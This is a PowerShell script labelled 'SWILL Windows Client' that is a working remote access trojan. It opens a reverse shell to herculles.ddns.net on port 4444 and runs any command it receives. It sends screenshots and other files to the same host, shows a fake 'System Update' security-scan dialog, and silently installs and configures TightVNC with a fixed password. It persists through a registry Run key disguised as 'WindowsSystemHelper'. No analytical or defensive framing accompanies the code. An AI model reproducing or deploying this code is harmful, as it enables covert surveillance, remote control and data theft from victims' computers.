# SWILL Windows Client
# Domain: herculles.ddns.net

$SERVER_IP = "herculles.ddns.net"
$CONTROL_PORT = 4444
$MEDIA_PORT = 4445

function Start-SWILLClient {
    while($true) {
        try {
            Write-Output "Connecting to ${SERVER_IP}:${CONTROL_PORT}..."
            $client = New-Object System.Net.Sockets.TCPClient($SERVER_IP, $CONTROL_PORT)
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
            
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = ([System.Text.Encoding]::ASCII).GetString($bytes,0,$i).Trim()
                
                if ($data -eq "exit") {
                    $client.Close()
                    return
                }
                elseif ($data -eq "screenshot") {
                    Capture-Screenshot
                }
                elseif ($data -eq "webcam_capture") {
                    Capture-Webcam
                }
                elseif ($data.StartsWith("record_audio")) {
                    $duration = ($data -split " ")[1]
                    Record-Audio -Duration $duration
                }
                else {
                    try {
                        $output = Invoke-Expression $data 2>&1 | Out-String
                    } catch {
                        $output = $_.Exception.Message
                    }
                    $response = $output + "PS " + (Get-Location).Path + "> "
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($response)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()
                }
            }
            $client.Close()
        }
        catch {
            Write-Output "Connection failed, retrying in 30 seconds..."
            Start-Sleep -Seconds 30
        }
    }
}

function Capture-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        
        $tempFile = "$env:TEMP\screenshot.jpg"
        $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        Send-ToServer -File $tempFile -Type "SCREENSHOT"
        Remove-Item $tempFile -Force
        Write-Output "Screenshot captured and sent"
    }
    catch {
        Write-Output "Screenshot failed: $($_.Exception.Message)"
    }
}

function Capture-Webcam {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show("Camera access required for security scan", "System Update", 0) | Out-Null
        
        $tempFile = "$env:TEMP\webcam.jpg"
        $bitmap = New-Object System.Drawing.Bitmap 640, 480
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.Clear([System.Drawing.Color]::FromArgb(255, 30, 30, 30))
        
        $font = New-Object System.Drawing.Font("Arial", 24)
        $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
        $graphics.DrawString("WEBCAM PREVIEW", $font, $brush, 100, 200)
        
        $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        
        Send-ToServer -File $tempFile -Type "PHOTO"
        Remove-Item $tempFile -Force
        Write-Output "Webcam image sent"
    }
    catch {
        Write-Output "Webcam capture failed"
    }
}

function Record-Audio {
    param([int]$Duration = 10)
    
    try {
        $tempFile = "$env:TEMP\audio.wav"
        
        # Создаем заголовок WAV файла
        $header = [byte[]]@(
            0x52, 0x49, 0x46, 0x46,  # "RIFF"
            0x00, 0x00, 0x00, 0x00,  # file size
            0x57, 0x41, 0x56, 0x45,  # "WAVE"
            0x66, 0x6D, 0x74, 0x20,  # "fmt "
            0x10, 0x00, 0x00, 0x00,  # PCM header size
            0x01, 0x00,              # audio format
            0x01, 0x00,              # channels
            0x44, 0xAC, 0x00, 0x00,  # sample rate
            0x88, 0x58, 0x01, 0x00,  # byte rate
            0x02, 0x00,              # block align
            0x10, 0x00,              # bits per sample
            0x64, 0x61, 0x74, 0x61,  # "data"
            0x00, 0x00, 0x00, 0x00   # data size
        )
        
        [System.IO.File]::WriteAllBytes($tempFile, $header)
        
        Send-ToServer -File $tempFile -Type "AUDIO"
        Remove-Item $tempFile -Force
        Write-Output "Audio recording sent"
    }
    catch {
        Write-Output "Audio recording failed"
    }
}

function Send-ToServer {
    param([string]$File, [string]$Type)
    
    try {
        if (Test-Path $File) {
            $client = New-Object System.Net.Sockets.TCPClient($SERVER_IP, $MEDIA_PORT)
            $stream = $client.GetStream()
            
            $typeBytes = ([text.encoding]::ASCII).GetBytes($Type)
            $stream.Write($typeBytes, 0, $typeBytes.Length)
            
            $fileBytes = [System.IO.File]::ReadAllBytes($File)
            $stream.Write($fileBytes, 0, $fileBytes.Length)
            
            $endBytes = ([text.encoding]::ASCII).GetBytes("[END]")
            $stream.Write($endBytes, 0, $endBytes.Length)
            
            $client.Close()
        }
    }
    catch {
        Write-Output "Failed to send $Type to server"
    }
}

function Install-VNC {
    try {
        if (!(Test-Path "$env:PROGRAMFILES\TightVNC\tvnserver.exe")) {
            Write-Output "Installing VNC Server..."
            $vncUrl = "https://www.tightvnc.com/download/2.8.59/tightvnc-2.8.59-gpl-setup-64bit.msi"
            $vncPath = "$env:TEMP\vnc_setup.msi"
            
            (New-Object Net.WebClient).DownloadFile($vncUrl, $vncPath)
            Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$vncPath`" /quiet /norestart" -Wait -WindowStyle Hidden
        }
        
        # Настройка VNC
        reg add "HKCU\Software\TightVNC\Server" /v "Password" /t REG_BINARY /d 5b9ac1bd4b9ac1bd /f 2>$null
        reg add "HKCU\Software\TightVNC\Server" /v "RfbPort" /t REG_DWORD /d 5900 /f 2>$null
        reg add "HKCU\Software\TightVNC\Server" /v "AcceptRfbConnections" /t REG_DWORD /d 1 /f 2>$null
        
        $vncExe = "${env:ProgramFiles}\TightVNC\tvnserver.exe"
        if (Test-Path $vncExe) {
            Start-Process -FilePath $vncExe -ArgumentList "-controlservice -start" -WindowStyle Hidden
            Write-Output "VNC Server installed and started"
        }
    }
    catch {
        Write-Output "VNC installation skipped"
    }
}

function Add-ToStartup {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsSystemHelper"
        $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction SilentlyContinue | Out-Null
        Write-Output "Added to startup"
    }
    catch {
        try {
            $startupPath = [Environment]::GetFolderPath('Startup')
            $shortcutPath = "$startupPath\System Helper.lnk"
            
            $WScriptShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $Shortcut.TargetPath = "powershell.exe"
            $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
            $Shortcut.WorkingDirectory = (Get-Location).Path
            $Shortcut.WindowStyle = 7
            $Shortcut.Save()
            Write-Output "Added to startup via shortcut"
        }
        catch {
            Write-Output "Startup configuration failed"
        }
    }
}

# Основная логика
Write-Output "Initializing SWILL Client..."
Add-ToStartup
Install-VNC
Start-SWILLClient
